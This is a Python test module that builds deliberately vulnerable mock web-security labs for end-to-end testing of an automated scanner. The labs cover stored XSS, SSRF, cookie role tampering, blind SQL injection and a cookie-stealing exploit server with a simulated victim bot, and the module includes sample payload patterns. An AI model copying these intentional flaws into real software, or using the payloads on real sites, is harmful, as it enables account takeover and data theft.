"""Strict, PortSwigger-faithful Academy lookalikes for END-TO-END testing.

Unlike test_general_solver.py (which pre-seeds findings and calls the solve
phase directly), these mocks are full applications behind ``run_scan``:

* per-session CSRF tokens enforced on every state-changing POST
* required comment fields with email-format validation
* session cookies issued on first visit and ROTATED on login
* a 302-to-/login2 second factor standing between login and the account
* an admin page only the server itself may fetch (SSRF-only)
* a sibling exploit-server application with an access log and a victim bot
* a solved banner that flips ONLY on the platform's true objective

If the pipeline cannot take one of these from "Not solved" to "Solved" on
its own, no unit test of the strategy engine matters -- the chain breaks
somewhere in crawl -> detect -> ladder -> strategy, and these tests fail.
"""

from __future__ import annotations

import asyncio
import re
import secrets
import socket
import threading
import time
from contextlib import contextmanager
from urllib.parse import parse_qs, quote, urlparse

import httpx
import uvicorn
from fastapi import FastAPI, Request, Response
from fastapi.responses import HTMLResponse, PlainTextResponse, RedirectResponse

# ---------------------------------------------------------------------------
# Shared markup + plumbing
# ---------------------------------------------------------------------------


def lab_page(title: str, body: str, solved: bool, hint: str = "") -> str:
    cls = "is-solved" if solved else "is-notsolved"
    status = "Solved" if solved else "Not solved"
    hint_html = f'<p id="hint">{hint}</p>' if hint else ""
    return (
        "<html><head><title>" + title + "</title></head><body>"
        "<div id=academyLabHeader><section class=academyLabBanner>"
        "<div class=title-container><h2>" + title + "</h2>" + hint_html + "</div>"
        "<div class='widgetcontainer-lab-status " + cls + "'><span>LAB</span>"
        "<p>" + status + "</p></div></section></div>" + body + "</body></html>"
    )


def _free_port() -> int:
    s = socket.socket()
    s.bind(("127.0.0.1", 0))
    port = s.getsockname()[1]
    s.close()
    return port


@contextmanager
def lab_server(app: FastAPI):
    port = _free_port()
    config = uvicorn.Config(app, host="127.0.0.1", port=port, log_level="warning")
    srv = uvicorn.Server(config)
    thread = threading.Thread(target=srv.run, daemon=True)
    thread.start()
    for _ in range(120):
        if srv.started:
            break
        time.sleep(0.05)
    try:
        yield f"http://127.0.0.1:{port}"
    finally:
        srv.should_exit = True
        thread.join(timeout=5)


class LabState:
    """Session store + objective state shared by one lab's routes."""

    def __init__(self, title: str) -> None:
        self.title = title
        self.solved = False
        self.sessions: dict[str, dict] = {}
        self.comments: dict[str, list[tuple[str, str]]] = {}

    def new_session(self, **kw) -> str:
        sid = secrets.token_hex(12)
        self.sessions[sid] = {"csrf": secrets.token_hex(12), "user": None, **kw}
        return sid

    def session_of(self, request: Request) -> dict | None:
        sid = request.cookies.get("session", "")
        return self.sessions.get(sid)

    def render(self, request: Request, build, rotate: bool = False) -> HTMLResponse:
        """Render a lab page, issuing (or rotating) the visitor's session.

        ``build(csrf)`` produces the page body using the session-bound csrf
        token -- for a brand-new visitor the token is embedded in the same
        response that sets the cookie, exactly like the Academy.
        """
        sess = self.session_of(request)
        if rotate or sess is None:
            sid = self.new_session()
            sess = self.sessions[sid]
            resp = HTMLResponse(lab_page(self.title, build(sess["csrf"]), self.solved))
            resp.set_cookie("session", sid)
            return resp
        return HTMLResponse(lab_page(self.title, build(sess["csrf"]), self.solved))


def login_form(csrf: str, message: str = "") -> str:
    return (
        (f"<p class=message>{message}</p>" if message else "")
        + "<form method=POST action=/login>"
        + f'<input type=hidden name=csrf value="{csrf}">'
        + '<input name=username><input name=password>'
        + '<button type=submit>Log in</button></form>'
    )


def admin_panel_html(users: list[str], deleted: list[str], base: str = "/admin") -> str:
    rows = "".join(
        f"<tr><td>{u}</td><td><a href='{base}/delete?username={u}'>Delete</a></td></tr>"
        for u in users
        if u not in deleted
    )
    return f"<h1>Admin panel</h1><table>{rows}</table>"


def blog_home(state: LabState, post_ids=(1, 2), extra_links: str = "") -> str:
    links = "".join(f'<a href="/post?postId={pid}">View post #{pid}</a><br>' for pid in post_ids)
    return (
        f"<header><a href=/login>My account</a>{extra_links}</header>" + links
    )


def post_page(state: LabState, post_id: str, csrf: str) -> str:
    comments = "".join(
        f"<section class=comment><p>{name}</p><p>{text}</p></section>"
        for name, text in state.comments.get(post_id, [])
    )
    form = (
        "<section class=post-comment><form method=POST action=/post/comment>"
        + f'<input type=hidden name=csrf value="{csrf}">'
        + f'<input type=hidden name=postId value="{post_id}">'
        + '<textarea name=comment></textarea>'
        + '<input name=name><input name=email><input name=website>'
        + '<button type=submit>Post comment</button></form></section>'
    )
    return f"<article>Post {post_id}</article>{comments}{form}"


async def handle_comment_post(state: LabState, request: Request) -> Response:
    """Store a comment -- with STRICT validation, like the Academy."""
    form = dict(await request.form())
    sess = state.session_of(request)
    if not sess or form.get("csrf") != sess["csrf"]:
        return PlainTextResponse("Invalid CSRF token", status_code=400)
    comment = (form.get("comment") or "").strip()
    name = (form.get("name") or "").strip()
    email = (form.get("email") or "").strip()
    post_id = form.get("postId", "1")
    if not comment:
        return PlainTextResponse("Comment is required", status_code=400)
    if not name:
        return PlainTextResponse("Name is required", status_code=400)
    if not re.fullmatch(r"\S+@\S+\.\S+", email):
        return PlainTextResponse("Invalid email address", status_code=400)
    state.comments.setdefault(post_id, []).append((name, comment))
    return RedirectResponse(f"/post?postId={post_id}", status_code=302)


async def handle_login_post(state: LabState, request: Request, credentials: dict, next_url: str):
    """Validate a login POST (csrf + credentials) like the Academy.

    Returns (error_response_or_none, ok_response_or_none).
    """
    form = dict(await request.form())
    sess = state.session_of(request)
    if not sess or form.get("csrf") != sess["csrf"]:
        return PlainTextResponse("Invalid CSRF token", status_code=400), None
    username = form.get("username", "")
    password = form.get("password", "")
    if credentials.get(username) == password:
        resp = RedirectResponse(next_url, status_code=302)
        resp.set_cookie("session", state.new_session(user=username))
        return None, resp
    body = login_form(sess["csrf"] if sess else secrets.token_hex(12), "Invalid username or password")
    return HTMLResponse(lab_page(state.title, body, state.solved)), None


XSS_TAG_RE = re.compile(r"<(script|img|svg)\b", re.IGNORECASE)
XSS_CALL_RE = re.compile(r"alert\(1\)|print\(\)", re.IGNORECASE)


def render_comments_raw(state: LabState, post_id: str) -> None:
    """Platform XSS checker: a stored executing payload that a browser would
    run flips the banner when the post is VIEWED."""
    for _name, text in state.comments.get(post_id, []):
        if XSS_TAG_RE.search(text) and XSS_CALL_RE.search(text):
            state.solved = True


# ---------------------------------------------------------------------------
# Lab 1: Stored XSS into HTML context with nothing encoded
# ---------------------------------------------------------------------------


def build_stored_xss_lab() -> tuple[FastAPI, LabState]:
    app = FastAPI()
    state = LabState("Stored XSS into HTML context with nothing encoded")

    @app.get("/", response_class=HTMLResponse)
    async def home(request: Request):
        return state.render(request, lambda csrf: blog_home(state))

    @app.get("/post", response_class=HTMLResponse)
    async def post(request: Request, postId: str = "1"):
        render_comments_raw(state, postId)
        return state.render(request, lambda csrf: post_page(state, postId, csrf))

    @app.post("/post/comment")
    async def comment(request: Request):
        return await handle_comment_post(state, request)

    return app, state


# ---------------------------------------------------------------------------
# Lab 2: 2FA simple bypass
# ---------------------------------------------------------------------------


def build_2fa_lab() -> tuple[FastAPI, LabState]:
    app = FastAPI()
    state = LabState("2FA simple bypass")
    credentials = {"carlos": "montoya"}

    @app.get("/", response_class=HTMLResponse)
    async def home(request: Request):
        return state.render(request, lambda csrf: '<a href=/login>My account</a>')

    @app.get("/login", response_class=HTMLResponse)
    async def login_page(request: Request):
        return state.render(request, lambda csrf: login_form(csrf))

    @app.post("/login")
    async def login(request: Request):
        err, ok = await handle_login_post(state, request, credentials, "/login2")
        if err is not None:
            return err
        return ok

    @app.get("/login2", response_class=HTMLResponse)
    async def login2(request: Request):
        sess = state.session_of(request)
        if not sess or not sess.get("user"):
            return RedirectResponse("/login", status_code=302)
        return state.render(request, lambda csrf: login_form(csrf))

    @app.get("/my-account", response_class=HTMLResponse)
    async def my_account(request: Request, id: str = ""):
        sess = state.session_of(request)
        if not sess or not sess.get("user"):
            return RedirectResponse("/login", status_code=302)
        if id and id != sess["user"]:
            return PlainTextResponse("Unauthorized", status_code=401)
        state.solved = sess["user"] == "carlos"
        html = (
            f"<p>Your username is: {sess['user']}</p>"
            f"<p>API key: {secrets.token_hex(8)}</p>"
            '<a href=/logout>Log out</a>'
        )
        return HTMLResponse(lab_page(state.title, html, state.solved))

    return app, state


# ---------------------------------------------------------------------------
# Lab 3: Basic SSRF against the local server
# ---------------------------------------------------------------------------


def build_ssrf_lab() -> tuple[FastAPI, LabState]:
    app = FastAPI()
    state = LabState("Basic SSRF against the local server")
    deleted: list[str] = []

    def internal_fetch(path: str, query: str) -> str:
        """The server fetching its own URL -- the only way to see /admin."""
        if path == "/admin":
            return lab_page(state.title, admin_panel_html(["peter", "carlos"], deleted), True)
        if path == "/admin/delete":
            user = (parse_qs(query).get("username") or [""])[0]
            if user and user not in deleted:
                deleted.append(user)
            if user == "carlos":
                state.solved = True
            return lab_page(state.title, admin_panel_html(["peter", "carlos"], deleted), True)
        if path == "/product/stock/check":
            return "42 units of product"
        return "Not found"

    @app.get("/", response_class=HTMLResponse)
    async def home(request: Request):
        return state.render(
            request, lambda csrf: '<a href="/product?productId=1">Product 1</a>'
        )

    @app.get("/product", response_class=HTMLResponse)
    async def product(request: Request):
        body = (
            "<form method=POST action=/product/stock>"
            '<input type=hidden name=stockApi value="/product/stock/check?productId=1&amp;storeId=1">'
            '<button type=submit>Check stock</button></form>'
        )
        return state.render(request, lambda csrf: body)

    @app.post("/product/stock")
    async def stock(request: Request):
        form = dict(await request.form())
        target = form.get("stockApi", "")
        parsed = urlparse(target)
        if parsed.scheme == "http" and parsed.hostname in ("localhost", "127.0.0.1"):
            return HTMLResponse(internal_fetch(parsed.path or "/", parsed.query))
        if parsed.path == "/product/stock/check":
            return PlainTextResponse("42 units of product")
        return PlainTextResponse("Bad request", status_code=400)

    @app.get("/admin")
    async def admin_external():
        return PlainTextResponse("Admin interface only available to local users", status_code=403)

    return app, state


# ---------------------------------------------------------------------------
# Lab 4: User role controlled by request parameter (cookie flip)
# ---------------------------------------------------------------------------


def build_cookie_role_lab() -> tuple[FastAPI, LabState]:
    app = FastAPI()
    state = LabState("User role controlled by request parameter")
    deleted: list[str] = []
    credentials = {"wiener": "peter"}

    @app.get("/", response_class=HTMLResponse)
    async def home(request: Request):
        return state.render(request, lambda csrf: '<a href=/login>My account</a>')

    @app.get("/login", response_class=HTMLResponse)
    async def login_page(request: Request):
        return state.render(request, lambda csrf: login_form(csrf))

    @app.post("/login")
    async def login(request: Request):
        err, ok = await handle_login_post(state, request, credentials, "/my-account?id=wiener")
        if err is not None:
            return err
        ok.set_cookie("Admin", "false")
        return ok

    @app.get("/my-account", response_class=HTMLResponse)
    async def my_account(request: Request, id: str = ""):
        sess = state.session_of(request)
        if not sess or not sess.get("user"):
            return RedirectResponse("/login", status_code=302)
        html = f"<p>Your username is: {sess['user']}</p><a href=/logout>Log out</a>"
        return HTMLResponse(lab_page(state.title, html, state.solved))

    @app.get("/admin")
    async def admin(request: Request):
        if request.cookies.get("Admin") != "true":
            return PlainTextResponse("Not authorized", status_code=403)
        return HTMLResponse(
            lab_page(state.title, admin_panel_html(["wiener", "carlos"], deleted), state.solved)
        )

    @app.get("/admin/delete")
    async def admin_delete(request: Request, username: str = ""):
        if request.cookies.get("Admin") != "true":
            return PlainTextResponse("Not authorized", status_code=403)
        if username and username not in deleted:
            deleted.append(username)
        if username == "carlos":
            state.solved = True
        return HTMLResponse(
            lab_page(state.title, admin_panel_html(["wiener", "carlos"], deleted), state.solved)
        )

    return app, state


# ---------------------------------------------------------------------------
# Lab 5: Unprotected admin functionality (robots.txt discloses the panel)
# ---------------------------------------------------------------------------


def build_robots_admin_lab() -> tuple[FastAPI, LabState]:
    app = FastAPI()
    state = LabState("Unprotected admin functionality with unpredictable URL")
    panel_path = "/administrator-7f9d2-panel"
    deleted: list[str] = []

    @app.get("/", response_class=HTMLResponse)
    async def home(request: Request):
        return state.render(request, lambda csrf: "<p>Welcome to the blog!</p>")

    @app.get("/robots.txt")
    async def robots():
        return PlainTextResponse(f"User-agent: *\nDisallow: {panel_path}\n")

    @app.get(panel_path)
    async def panel():
        return HTMLResponse(
            lab_page(
                state.title,
                admin_panel_html(["peter", "carlos"], deleted, base=panel_path),
                state.solved,
            )
        )

    @app.get(panel_path + "/delete")
    async def delete(username: str = ""):
        if username and username not in deleted:
            deleted.append(username)
        if username == "carlos":
            state.solved = True
        return HTMLResponse(
            lab_page(
                state.title,
                admin_panel_html(["peter", "carlos"], deleted, base=panel_path),
                state.solved,
            )
        )

    return app, state


# ---------------------------------------------------------------------------
# Lab 6: Exploiting cross-site scripting to steal cookies
# (lab app + sibling exploit-server app + autonomous victim bot)
# ---------------------------------------------------------------------------

VICTIM_SESSION = "0v1ct1ms3ss10nc00k13"


def build_cookie_steal_lab() -> tuple[FastAPI, FastAPI, LabState, dict, list]:
    lab = FastAPI()
    exploit = FastAPI()
    state = LabState("Exploiting cross-site scripting to steal cookies")
    exploit_log: list[str] = []
    exploit_base_box: dict[str, str] = {}

    @lab.get("/", response_class=HTMLResponse)
    async def home(request: Request):
        expl = exploit_base_box.get("base", "http://127.0.0.1:9")
        return state.render(
            request,
            lambda csrf: blog_home(
                state, post_ids=(1,), extra_links=f'<a href="{expl}">Exploit server</a>'
            ),
        )

    @lab.get("/post", response_class=HTMLResponse)
    async def post(request: Request, postId: str = "1"):
        render_comments_raw(state, postId)
        return state.render(request, lambda csrf: post_page(state, postId, csrf))

    @lab.post("/post/comment")
    async def comment(request: Request):
        return await handle_comment_post(state, request)

    @lab.get("/login", response_class=HTMLResponse)
    async def login_page(request: Request):
        return state.render(request, lambda csrf: login_form(csrf))

    @lab.get("/my-account", response_class=HTMLResponse)
    async def my_account(request: Request, id: str = ""):
        if id == "carlos" and request.cookies.get("session") == VICTIM_SESSION:
            state.solved = True
            html = "<p>Your username is: carlos</p><a href=/logout>Log out</a>"
            return HTMLResponse(lab_page(state.title, html, state.solved))
        return RedirectResponse("/login", status_code=302)

    @exploit.get("/", response_class=HTMLResponse)
    async def exploit_home():
        return HTMLResponse(
            "<h1>Exploit Server</h1><form><textarea name=responseBody></textarea></form>"
        )

    @exploit.get("/log", response_class=HTMLResponse)
    async def exploit_log_page():
        return HTMLResponse("<h1>Access log</h1><pre>" + "\n".join(exploit_log) + "</pre>")

    @exploit.get("/capture")
    async def exploit_capture(request: Request):
        exploit_log.append(f"GET /?c={request.url.query} HTTP/1.1")
        return PlainTextResponse("ok")

    async def victim_bot(base_lab: str, base_exploit: str):
        """The Academy's simulated victim: browses the blog, 'executes' any
        stored script (its cookie goes to whatever the payload points at)."""
        marker = f"document.location='{base_exploit}/?c='"
        async with httpx.AsyncClient(timeout=10) as client:
            while not state.solved:
                await asyncio.sleep(0.8)
                try:
                    r = await client.get(base_lab + "/post", params={"postId": "1"})
                    if marker not in r.text:
                        continue
                    await client.get(
                        base_exploit + "/capture?c=" + quote(f"session={VICTIM_SESSION}", safe="")
                    )
                except Exception:
                    continue

    return lab, exploit, state, exploit_base_box, [victim_bot]


# ---------------------------------------------------------------------------
# Lab 7 (1.2.0): SQL injection UNION attack, finding a column containing text
# Faithful PostgreSQL emulation measured against a LIVE Academy instance.
# ---------------------------------------------------------------------------

UNION_TEXT_TITLE = "SQL injection UNION attack, finding a column containing text"

# Backend query emulated:
#   SELECT price, name, rating FROM products WHERE category = '<value>'
#   AND released = 1
# Column typing is EXACTLY what a live instance showed on 2025 probes:
#   position 1 (price)  -> NUMERIC, a quoted string there is a PG 500
#   position 2 (name)   -> TEXT,    the only string-compatible column
#   position 3 (rating) -> NUMERIC, a quoted string there is a PG 500
# Other faithful behaviors (all verified on the live lab):
#   * the category value is NOT echoed anywhere in the page markup
#   * ORDER BY 4 -> 500, ORDER BY 1..3 -> 200
#   * an UNQUOTED payload embeds into the literal and stays VALID SQL
#     (HTTP 200, baseline rows only -- the v1.1.1 "literal trap")
#   * a lone appended quote leaves the string unterminated -> 500
#   * the lab flips to solved as soon as the HINT's target string comes
#     back through the vulnerable query (rendered in the product grid)

_UNION_TEXT_PRODUCTS = [
    # category,            price, name,             rating, released
    ("Accessories",        "39.99", "Sport Shoes",    "4", "1"),
    ("Accessories",        "19.50", "Leather Belt",   "5", "1"),
    ("Pets",               "12.00", "Dog Toy",        "3", "1"),
    ("Clothing",           "89.00", "Winter Jacket",  "4", "0"),
]


def _split_top_commas(row: str) -> list[str]:
    """Split a UNION arm on commas that are not inside string literals."""
    parts: list[str] = []
    cur: list[str] = []
    in_str = False
    i = 0
    while i < len(row):
        ch = row[i]
        if in_str:
            cur.append(ch)
            if ch == "'":
                if i + 1 < len(row) and row[i + 1] == "'":
                    cur.append("'")
                    i += 2
                    continue
                in_str = False
        elif ch == "'":
            in_str = True
            cur.append(ch)
        elif ch == ",":
            parts.append("".join(cur))
            cur = []
        else:
            cur.append(ch)
        i += 1
    parts.append("".join(cur))
    return parts


def _pg_expr(tok: str):
    """Type-resolve one UNION arm expression the way PostgreSQL does.

    Returns None for NULL, ("num", literal) for bare numbers, ("text", s)
    for quoted strings; raises ValueError for anything else (subqueries,
    functions, unbalanced quotes...) -- the mock must not pretend those
    evaluate, or the solve oracle could be gamed by reflection alone.
    """
    t = tok.strip()
    if t.upper() == "NULL":
        return None
    if len(t) >= 2 and t.startswith("'") and t.endswith("'"):
        inner = t[1:-1].replace("''", "'")
        return ("text", inner)
    if re.fullmatch(r"\d+(\.\d+)?", t):
        return ("num", t)
    raise ValueError("unsupported expression")


def build_union_text_lab(target: str | None = None):
    """Build the lookalike app. Returns (app, state, target_string)."""
    lab = FastAPI()
    state = LabState(UNION_TEXT_TITLE)
    target = target or secrets.token_hex(3).upper()
    state.hint = f"Make the database retrieve the string: '{target}'"

    def _grid(rows) -> str:
        return "".join(
            f'<section class=product><p>{p}</p><h3>{n}</h3><span>{r}</span></section>'
            for p, n, r in rows
        )

    def _page(rows) -> str:
        body = (
            "<a href='/filter?category=Accessories'>Accessories</a>"
            "<a href='/filter?category=Pets'>Pets</a>"
            "<a href='/filter?category=Clothing'>Clothing</a>"
            "<a href='/my-account'>My account</a>"
            + _grid(rows)
        )
        return lab_page(state.title, body, state.solved, hint=state.hint)

    def _query(value: str):
        """Execute the emulated backend SQL for one /filter request.

        Returns (status_code, rendered_rows). The literal is TOKENIZED the
        way PostgreSQL would: '' is an escaped quote inside the literal,
        the literal ends at the first unescaped quote, everything after it
        is injected SQL that must parse or the query 500s.
        """
        sql = "SELECT price, name, rating FROM products WHERE category = '" + value + "' AND released = 1"
        start = sql.index("category = '") + len("category = '")
        i, buf, closed = start, [], False
        while i < len(sql):
            ch = sql[i]
            if ch == "'":
                if i + 1 < len(sql) and sql[i + 1] == "'":
                    buf.append("'")
                    i += 2
                    continue
                closed = True
                break
            buf.append(ch)
            i += 1
        if not closed:
            return 500, []  # unterminated string literal -> PG syntax error
        literal = "".join(buf)
        rest = sql[i + 1:]
        cm = rest.find("--")
        active = (rest if cm < 0 else rest[:cm]).strip()
        # The INJECTED SQL comes first (right after the closing quote); the
        # untouched `AND released = 1` suffix trails at the END -- unless the
        # comment ate it. Strip from the END, never from the front.
        suffix = "AND released = 1"
        if active.upper().endswith(suffix.upper()):
            injected = active[: -len(suffix)].strip()
        elif not active:
            injected = ""
        else:
            injected = active  # the comment consumed the suffix
        base_rows = [
            (p, n, r)
            for cat, p, n, r, rel in _UNION_TEXT_PRODUCTS
            if cat == literal and rel == "1"
        ]
        if not injected:
            return 200, base_rows
        m = re.fullmatch(r"AND\s+'(\d+)'\s*=\s*'(\d+)'", injected, re.IGNORECASE)
        if m:
            return 200, base_rows if m.group(1) == m.group(2) else []
        m = re.fullmatch(r"AND\s+(\d+)\s*=\s*(\d+)", injected, re.IGNORECASE)
        if m:
            return 200, base_rows if m.group(1) == m.group(2) else []
        m = re.fullmatch(r"ORDER\s+BY\s+(\d+)", injected, re.IGNORECASE)
        if m:
            return (200, base_rows) if int(m.group(1)) <= 3 else (500, [])
        m = re.match(r"UNION\s+SELECT\s+(.*)$", injected, re.IGNORECASE | re.DOTALL)
        if m:
            try:
                vals = [_pg_expr(t) for t in _split_top_commas(m.group(1))]
            except ValueError:
                return 500, []
            if len(vals) != 3:
                return 500, []
            for idx, v in enumerate(vals):
                if v is None:
                    continue
                if idx == 1 and v[0] != "text":
                    return 500, []  # PG: types integer/text cannot be matched
                if idx != 1 and v[0] != "num":
                    return 500, []
            union_row = [(v[1] if v else "NULL") for v in vals]
            # Solve oracle: the objective string came back through the query.
            if union_row[1] == target:
                state.solved = True
            return 200, base_rows + [tuple(union_row)]
        return 500, []  # anything else: PG semantic/syntax error

    @lab.get("/", response_class=HTMLResponse)
    async def home():
        return _page([])

    @lab.get("/filter", response_class=HTMLResponse)
    async def filter_products(category: str = ""):
        code, rows = _query(category)
        if code == 500:
            return HTMLResponse(
                "<html><body><pre>ERROR: syntax error at or near</pre></body></html>",
                status_code=500,
            )
        return _page(rows)

    @lab.get("/login", response_class=HTMLResponse)
    async def login_page():
        return HTMLResponse(
            "<html><body><form method=POST action=/login>"
            "<input name=username><input name=password>"
            "<button type=submit>Log in</button></form></body></html>"
        )

    @lab.post("/login")
    async def login(request: Request):
        form = await request.form()
        user = str(form.get("username", ""))
        pwd = str(form.get("password", ""))
        if user == "administrator" and pwd:
            resp = RedirectResponse("/", status_code=303)
            resp.set_cookie("session", f"owned-by-{user}")
            return resp
        return HTMLResponse(
            "<html><body>Invalid username or password.</body></html>",
            status_code=401,
        )

    return lab, state, target


# ---------------------------------------------------------------------------
# Lab 9 (1.2.0): Blind SQL injection with conditional responses
# Faithful lookalike of the LIVE Academy lab measured on 2026-10-12:
#   * the TrackingId cookie is interpolated into
#       SELECT username FROM sessions WHERE sessionid='<value>'
#   * a valid row renders a small 'Welcome back' block inside a LARGE shop
#     page; an invalid row omits it. Whole-page similarity between the
#     TRUE and FALSE pages stays >= 0.98 -- the exact property that made
#     1.1.x similarity-based detection miss this lab family
#   * the users table holds administrator with a 20-char password
#   * POST /login (session-bound csrf) as administrator flips the banner
# ---------------------------------------------------------------------------

BLIND_CONDITIONAL_TITLE = "Blind SQL injection with conditional responses"


def build_blind_conditional_lab():
    import sqlite3
    import string as _string

    lab = FastAPI()
    state = LabState(BLIND_CONDITIONAL_TITLE)

    password = "".join(
        secrets.choice(_string.ascii_lowercase + _string.digits) for _ in range(20)
    )
    # requests are served on the uvicorn thread; the builder thread only
    # seeds the schema -- allow cross-thread use of the shared connection
    conn = sqlite3.connect(":memory:", check_same_thread=False)
    conn.execute("CREATE TABLE users (username TEXT, password TEXT)")
    conn.execute("INSERT INTO users VALUES ('administrator', ?)", (password,))
    conn.execute("INSERT INTO users VALUES ('wiener', 'peter')  ")
    conn.execute("CREATE TABLE sessions (sessionid TEXT, username TEXT)")
    conn.commit()

    categories = ("Accessories", "Pets", "Clothing", "Food", "Toys")

    def _shop_page(welcome: bool) -> str:
        # Large page: the welcome block is a tiny fraction of the markup,
        # mirroring the real lab's shop template.
        grid = "".join(
            f"<section class=product><h3>Gadget {i}</h3><p>$19.9{i}</p>"
            f"<a href='/product?productId={i}'>View details</a></section>"
            for i in range(1, 41)
        )
        cats = "".join(f"<a href='/filter?category={c}'>{c}</a>" for c in categories)
        nav = "<a href='/login'>Login</a> <a href='/my-account'>My account</a>"
        welcome_block = "<p>Welcome back!</p>" if welcome else ""
        return lab_page(state.title, nav + welcome_block + cats + grid, state.solved)

    def _tracked(request: Request) -> tuple[str, bool]:
        """Backend emulation: raw cookie interpolation into the lookup.

        Returns (effective_tid, row_found). Injections are parsed by the
        real SQLite engine, so ``--`` comments, self-balancing quotes and
        broken literals all behave exactly like the live PostgreSQL lab.
        """
        tid = request.cookies.get("TrackingId", "")
        try:
            row = conn.execute(
                "SELECT username FROM sessions WHERE sessionid='" + tid + "'"
            ).fetchall()
        except sqlite3.Error:
            row = []
        return tid, bool(row)

    @lab.get("/", response_class=HTMLResponse)
    async def home(request: Request):
        tid, found = _tracked(request)
        if not tid:
            new_tid = secrets.token_hex(16)
            conn.execute(
                "INSERT INTO sessions VALUES (?, 'administrator')", (new_tid,)
            )
            conn.commit()
            resp = HTMLResponse(_shop_page(welcome=False))
            resp.set_cookie("TrackingId", new_tid, path="/")
            return resp
        return HTMLResponse(_shop_page(welcome=found))

    @lab.get("/filter", response_class=HTMLResponse)
    async def filter_products(request: Request, category: str = ""):
        _tid, found = _tracked(request)
        return HTMLResponse(_shop_page(welcome=found))

    @lab.get("/product", response_class=HTMLResponse)
    async def product(request: Request, productId: str = ""):
        _tid, found = _tracked(request)
        return HTMLResponse(
            lab_page(state.title, f"<h1>Gadget {productId}</h1>", state.solved)
        )

    @lab.get("/login", response_class=HTMLResponse)
    async def login_page(request: Request):
        sess = state.session_of(request)
        if sess is None:
            sid = state.new_session()
            sess = state.sessions[sid]
            resp = HTMLResponse(
                lab_page(state.title, login_form(sess["csrf"]), state.solved)
            )
            resp.set_cookie("session", sid)
            return resp
        return HTMLResponse(
            lab_page(state.title, login_form(sess["csrf"]), state.solved)
        )

    @lab.post("/login")
    async def login_post(request: Request):
        form = dict(await request.form())
        err, ok = await handle_login_post(
            state,
            request,
            {"administrator": password, "wiener": "peter"},
            "/my-account?id=administrator",
        )
        if ok is not None and form.get("username") == "administrator":
            state.solved = True  # the platform's objective: admin login
        return err if err is not None else ok

    @lab.get("/my-account", response_class=HTMLResponse)
    async def my_account(request: Request):
        sess = state.session_of(request)
        user = (sess or {}).get("user")
        if not user:
            return RedirectResponse("/login", status_code=302)
        return HTMLResponse(
            lab_page(state.title, f"<h1>My account: {user}</h1>", state.solved)
        )

    return lab, state, password


# ---------------------------------------------------------------------------
# Lab: Blind SQL injection with conditional errors (Oracle lookalike)
# ---------------------------------------------------------------------------

BLIND_ERROR_TITLE = "Blind SQL injection with conditional errors"


def build_blind_error_lab():
    """Emulates the 'conditional errors' lab's observable behaviour.

    The TrackingId cookie is interpolated into
        SELECT TrackingId FROM agents WHERE TrackingId='<tid>'
    The backend is emulated (a real SQLite engine would swallow the errors
    that ARE the signal here): a string-literal scanner decides whether the
    substituted query would parse -- a broken literal yields HTTP 500, a
    balanced one runs normally. ``'||(SELECT CASE WHEN (cond) THEN
    TO_CHAR(1/0) ELSE '' END FROM dual)||'``-style conditional-error payloads
    are evaluated against the seeded users table: TRUE -> division-by-zero
    -> HTTP 500, FALSE -> 200. Boolean payloads produce NO differential at
    all (both TRUE and FALSE render the identical shop page), exactly like
    the live lab. Logging in as administrator flips the banner.
    """
    import string as _string

    lab = FastAPI()
    state = LabState(BLIND_ERROR_TITLE)

    password = "".join(
        secrets.choice(_string.ascii_letters + _string.digits) for _ in range(20)
    )
    users = {"administrator": password, "wiener": "peter"}

    def _valid_query(value: str) -> bool:
        """String-literal scanner: True when the query would parse."""
        src = "'" + value + "'"  # the literal the cookie lands inside
        inside = False
        i = 0
        while i < len(src):
            c = src[i]
            if inside:
                if c == "'":
                    if i + 1 < len(src) and src[i + 1] == "'":
                        i += 2
                        continue
                    inside = False
            else:
                if c == "'":
                    inside = True
            i += 1
        return not inside

    _COND_RE = re.compile(r"CASE WHEN \((.*?)\) THEN")
    _LEN_RE = re.compile(
        r"LENGTH\(\(SELECT (\w+) FROM (\w+) WHERE (\w+)='([^']*)'\)\)>(\d+)"
    )
    _CHAR_RE = re.compile(
        r"ASCII\(SUBSTR\(\(SELECT (\w+) FROM (\w+) WHERE (\w+)='([^']*)'\),(\d+),1\)\)>(\d+)"
    )

    def _eval_cond(cond: str) -> bool:
        if cond == "1=1":
            return True
        if cond == "1=2":
            return False
        m = _LEN_RE.fullmatch(cond)
        if m:
            _col, table, ucol, uname, mm = m.groups()
            if table == "users" and ucol == "username" and uname in users:
                return len(users[uname]) > int(mm)
            return False
        m = _CHAR_RE.fullmatch(cond)
        if m:
            _col, table, ucol, uname, idx, mm = m.groups()
            if table == "users" and ucol == "username" and uname in users:
                pw = users[uname]
                i = int(idx)
                if 1 <= i <= len(pw):
                    return ord(pw[i - 1]) > int(mm)
            return False
        return False

    def _error_page() -> HTMLResponse:
        return HTMLResponse(
            "<html><body><p>Internal Server Error</p></body></html>",
            status_code=500,
        )

    def _shop() -> str:
        grid = "".join(
            f"<section class=product><h3>Gadget {i}</h3><p>$19.9{i}</p>"
            f"<a href='/product?productId={i}'>View details</a></section>"
            for i in range(1, 41)
        )
        nav = "<a href='/login'>Login</a> <a href='/my-account'>My account</a>"
        return lab_page(state.title, nav + grid, state.solved)

    def _respond(request: Request) -> Response:
        tid = request.cookies.get("TrackingId", "")
        if not tid:
            resp = HTMLResponse(_shop())
            resp.set_cookie("TrackingId", secrets.token_hex(16), path="/")
            return resp
        if not _valid_query(tid):
            return _error_page()
        cm = _COND_RE.search(tid)
        if cm and "1/0" in tid and _eval_cond(cm.group(1)):
            return _error_page()
        return HTMLResponse(_shop())

    @lab.get("/", response_class=HTMLResponse)
    async def home(request: Request):
        return _respond(request)

    @lab.get("/filter", response_class=HTMLResponse)
    async def filter_products(request: Request, category: str = ""):
        return _respond(request)

    @lab.get("/product", response_class=HTMLResponse)
    async def product(request: Request, productId: str = ""):
        return _respond(request)

    @lab.get("/login", response_class=HTMLResponse)
    async def login_page(request: Request):
        sess = state.session_of(request)
        if sess is None:
            sid = state.new_session()
            sess = state.sessions[sid]
            resp = HTMLResponse(
                lab_page(state.title, login_form(sess["csrf"]), state.solved)
            )
            resp.set_cookie("session", sid)
            return resp
        return HTMLResponse(
            lab_page(state.title, login_form(sess["csrf"]), state.solved)
        )

    @lab.post("/login")
    async def login_post(request: Request):
        form = dict(await request.form())
        err, ok = await handle_login_post(
            state,
            request,
            users,
            "/my-account?id=administrator",
        )
        if ok is not None and form.get("username") == "administrator":
            state.solved = True  # the platform's objective: admin login
        return err if err is not None else ok

    @lab.get("/my-account", response_class=HTMLResponse)
    async def my_account(request: Request):
        sess = state.session_of(request)
